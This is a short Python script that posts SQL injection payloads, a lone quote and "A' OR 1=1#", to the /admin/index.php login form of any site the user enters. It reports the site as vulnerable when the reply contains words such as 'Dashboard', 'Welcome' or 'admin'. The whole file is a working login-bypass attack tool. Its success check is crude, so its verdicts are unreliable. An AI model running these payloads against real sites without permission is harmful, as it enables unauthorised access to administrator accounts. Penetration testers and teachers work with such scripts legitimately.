import requests
from urllib.parse import urljoin

def test_sql_injection(base_url):
    endpoint = "/admin/index.php"
    full_url = urljoin(base_url, endpoint)
    
    payloads = [
        {
            'username': "'",
            'password': 'test',
            'login': ''
        },
        {
            'username': "A' OR 1=1#",
            'password': '1',
            'login': ''
        }
    ]
    
    for payload in payloads:
        response = requests.post(full_url, data=payload)
        
        if ("Dashboard" in response.text or 
            "Welcome" in response.text or 
            "admin" in response.text or 
            (response.status_code == 200 and "invalid" not in response.text.lower())):
            print(f"Vulnerable to SQL Injection with payload: {payload}")
        else:
            print(f"Not vulnerable with payload: {payload}")
            print("Test manually.")
            print("Received response (first 500 characters):\n")
            print(response.text[:500])
            print("="*50)

if __name__ == "__main__":
    url = input("Enter the site URL: ")
    test_sql_injection(url)
